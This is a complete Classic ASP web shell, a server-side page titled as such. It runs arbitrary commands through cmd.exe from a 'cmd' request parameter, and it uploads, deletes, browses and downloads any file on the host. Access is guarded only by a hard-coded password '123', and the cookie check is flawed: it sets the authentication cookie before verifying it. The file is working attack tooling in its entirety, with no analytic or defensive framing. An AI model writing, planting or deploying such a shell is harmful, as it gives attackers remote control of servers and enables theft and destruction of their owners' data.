<%@ Language=VBScript %>
<%
Const PASSWORD = "123"
Dim output : output = ""

' ===================== AUTHENTICATION =====================
Dim auth
auth = Request.Cookies("auth")
If auth <> PASSWORD Then
    Response.Cookies("auth") = PASSWORD
    Response.Write "<form method='post'><input type='password' name='auth'/><input type='submit' value='Login'/></form>"
   
    If Request.Form("auth") = PASSWORD Then
        Response.Cookies("auth") = PASSWORD
        Response.Redirect Request.ServerVariables("SCRIPT_NAME")
    End If
    Response.End
End If

' ===================== VARIABLES =====================
Dim path, cmd, download, del
path = Trim(Request("path"))
If path = "" Then path = Server.MapPath(".")

cmd = Request("cmd")
download = Request("download")
del = Request("delete")

' ===================== UPLOAD FILE (CORRECTED) =====================
If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
    On Error Resume Next
    Dim fso, stream, binData, fileName, savePath
    
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    ' Get uploaded file name
    fileName = Request.Form("file")
    If fileName <> "" Then
        fileName = fso.GetFileName(fileName)
        savePath = path & "\" & fileName
        
        ' Read binary data and save
        binData = Request.BinaryRead(Request.TotalBytes)
        
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write binData
        stream.SaveToFile savePath, 2 ' Overwrite
        stream.Close
        
        If Err.Number = 0 Then
            output = "✅ File uploaded successfully: " & fileName
        Else
            output = "❌ Upload Error: " & Err.Description
        End If
    Else
        output = "No file selected!"
    End If
    On Error GoTo 0
End If

' ===================== DELETE FILE =====================
If del <> "" Then
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Dim fileToDel : fileToDel = path & "\" & del
    If fso.FileExists(fileToDel) Then
        fso.DeleteFile fileToDel
        output = "File deleted: " & del
    Else
        output = "File not found: " & del
    End If
    If Err.Number <> 0 Then output = "Delete Error: " & Err.Description
    On Error GoTo 0
End If

' ===================== COMMAND EXECUTION =====================
If cmd <> "" Then
    On Error Resume Next
    Dim WShell, exec
    Set WShell = Server.CreateObject("WScript.Shell")
    Set exec = WShell.Exec("cmd.exe /c " & cmd)
    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
    If Err.Number <> 0 Then output = "Cmd Error: " & Err.Description
    On Error GoTo 0
End If

' ===================== DOWNLOAD =====================
If download <> "" Then
    Dim dstream
    Set dstream = Server.CreateObject("ADODB.Stream")
    dstream.Type = 1
    dstream.Open
    dstream.LoadFromFile download
    Response.ContentType = "application/octet-stream"
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(download, InStrRev(download,"\")+1)
    Response.BinaryWrite dstream.Read
    dstream.Close
    Response.End
End If
%>

<html>
<head>
    <title>Classic ASP Web Shell</title>
    <style>
        body{font-family:monospace; background:#111; color:#0f0;}
        input, button {padding:5px;}
        pre {background:#222; padding:10px; color:#0f0;}
    </style>
</head>
<body>
    <h2>Classic ASP Web Shell</h2>
   
    <form method="get">
        Path: <input type="text" name="path" value="<%=Server.HTMLEncode(path)%>" style="width:500px"/>
        <input type="submit" value="Browse"/>
    </form>
    
    <form method="get">
        Command: <input type="text" name="cmd" style="width:500px"/>
        <input type="submit" value="Run"/>
    </form>
    
    <!-- Upload Form -->
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="path" value="<%=Server.HTMLEncode(path)%>"/>
        Upload: <input type="file" name="file"/>
        <input type="submit" value="Upload File"/>
    </form>
    <hr>
    
    <pre><%=Server.HTMLEncode(output)%></pre>
    <%= ListFiles(path) %>
</body>
</html>

<%
' ===================== LIST FILES =====================
Function ListFiles(p)
    Dim html : html = "<h3>Index of " & Server.HTMLEncode(p) & "</h3><ul>"
    Dim fso, folder, item
   
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
   
    If fso.FolderExists(p) Then
        Set folder = fso.GetFolder(p)
       
        For Each item In folder.SubFolders
            html = html & "<li><a href='?path=" & Server.URLEncode(item.Path) & "'><b>[" & Server.HTMLEncode(item.Name) & "]</b></a></li>"
        Next
       
        For Each item In folder.Files
            html = html & "<li>" & Server.HTMLEncode(item.Name) & " - " & _
                         "<a href='?download=" & Server.URLEncode(item.Path) & "'>[Download]</a> | " & _
                         "<a href='?delete=" & Server.URLEncode(item.Name) & "'>[Delete]</a></li>"
        Next
    Else
        html = html & "<li style='color:red'>Path not found!</li>"
    End If
   
    html = html & "</ul>"
    ListFiles = html
    On Error GoTo 0
End Function
%>
